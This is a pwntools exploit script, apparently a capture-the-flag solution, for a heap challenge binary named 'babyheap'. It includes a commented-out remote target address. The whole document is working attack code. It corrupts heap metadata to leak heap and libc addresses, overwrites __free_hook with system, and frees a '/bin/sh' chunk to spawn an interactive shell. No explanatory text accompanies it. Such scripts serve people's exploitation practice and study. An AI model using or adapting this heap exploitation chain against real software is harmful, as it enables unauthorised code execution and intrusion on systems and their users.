
from pwn import *
 
p=process(['./babyheap'],env={'LD_PRELOAD':'./libc.so.6'},aslr='FALSE')
#p=remote('106.75.67.115',9999)
e=ELF('./libc.so.6')
def create(a,b):
    p.writeline('1')
    p.readuntil('Index:')
    p.writeline(str(a))
    p.readuntil('Content:')
    p.writeline(b)
    p.readuntil('Choice:')
def dele(a):
    p.writeline('4')
    p.readuntil('Index:')
    p.writeline(str(a))
    p.readuntil('Choice:')
def edit(a,b):
    p.writeline('2')
    p.readuntil('Index:')
    p.writeline(str(a))
    p.readuntil('Content:')
    p.writeline(b)
    p.readuntil('Choice:')
context(log_level='debug')
p.readuntil('Choice:')
create(1,p64(0x31)*3+chr(0x31))
create(2,'/bin/sh')
create(3,'')
create(4,p64(0x31)*3)
create(5,'')
create(6,'')
create(7,'')
dele(2)
dele(3)
p.writeline('3')
p.readuntil('Index:')
p.writeline('3')
heap=u64((p.readuntil('\n')[:-1]).ljust(8,chr(0x0)))-0x30
print hex(heap)
edit(3,p64(heap+0xa0))
 
 
zz=p64(0x90)*3+chr(0x90)
create(8,'')
edit(4,p64(0x31)*2+p64(heap+0x20))
 
create(0,zz)
 
zz=p64(0x0)+p64(0x91)+p64(0x6020a8-0x18)+p32(0x6020a8-0x10)
create(9,zz)
 
dele(5)
 
edit(9,p64(0x6020b0)+p64(0x6020a0)+p64(0)+p32(heap-0x6020a0+1))
 
dele(6)
#gdb.attach(p)
p.writeline('3')
p.readuntil('Index:')
p.writeline('6')
libc=u64((p.readuntil('\n')[:-1]).ljust(8,chr(0x0)))-0x3C4B78
print hex(libc)
system=libc+e.symbols['system']
free_hook=libc+e.symbols['__free_hook']
edit(7,p64(free_hook))
edit(8,p64(system))
 
 
 
p.interactive()
